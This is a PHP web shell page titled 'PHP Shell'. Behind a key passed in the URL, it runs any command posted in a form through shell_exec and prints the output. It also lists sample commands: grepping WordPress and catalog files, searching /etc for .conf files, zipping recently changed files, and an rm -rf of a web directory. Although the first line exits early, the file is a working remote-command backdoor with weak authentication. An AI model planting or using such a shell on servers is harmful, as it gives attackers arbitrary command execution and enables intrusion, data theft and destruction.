<?php
exit;
$key = '_xxx';
if(empty($_GET['key']) || $_GET['key']!=$key){
	exit;
}
if (!empty($_POST['cmd'])) {
    $cmd = shell_exec($_POST['cmd']);
}else{
	$cmd = false;
}
?>
<!DOCTYPE html>
<html>
<head>

    <meta charset="utf-8">

    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <meta name="viewport" content="width=device-width, initial-scale=1">

    <link rel="stylesheet" type="text/css" href="//bootswatch.com/4/flatly/bootstrap.min.css">

    <title>Web Shell</title>

    <style>
        h2 {
            color: rgba(0, 0, 0, .75);
        }

        pre {
            padding: 15px;
            -webkit-border-radius: 5px;
            -moz-border-radius: 5px;
            border-radius: 5px;
            background-color: #ECF0F1;
        }

        .container {
            width: 850px;
        }
    </style>

</head>

<body>

    <div class="container">

        <div class="pb-2 mt-4 mb-2">
	    <h1>PHP Shell</h1>
            <h2> Execute a command </h2>
            <pre>
			<div class=""><?=__DIR__;?></div>
			<div class="">grep -rn --include=\*.php 'wp-content' -e 'Template Name'</div>
			<div class="">grep -rn 'catalog' -e 'xxx'</div>
			<div class="">find '/etc/' -name '*.conf'</div>
			<div class="">zip -qr filename.zip folderToZipPath</div>
			<div class="">find . -cmin -400 -print | zip newZipFile.zip -@</div>
			</pre>
            <pre>find catalog -type f -print0 | xargs -0 sed -i '' -e 's/что меняем/на что меняем/g'</pre>
            <pre class=""><div>rm -rf /var/www/domains/test/*</div>
            <div>find . -cmin -400 -not -path "./system/*" -not -path "./export/*" -exec cp --parents \{\} /var/www/domains/test \;</div>
            <div>chown -R apache:apache /var/www/domains/test</div></pre>
        </div>

        <form method="POST">
            <div class="form-group">
                <label for="cmd"><strong>Command</strong></label>
                <input type="text" class="form-control" name="cmd" id="cmd" value="<?= htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') ?>" required>
            </div>
            <button type="submit" class="btn btn-primary">Execute</button>
        </form>

<?php if ($cmd): ?>
        <div class="pb-2 mt-4 mb-2">
            <h2> Output </h2>
        </div>
        <pre>
<?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?>
        </pre>
<?php elseif (!$cmd && $_SERVER['REQUEST_METHOD'] == 'POST'): ?>
        <div class="pb-2 mt-4 mb-2">
            <h2> Output </h2>
        </div>
        <pre><small>No result.</small></pre>
<?php endif; ?>
    </div>

</body>

</html>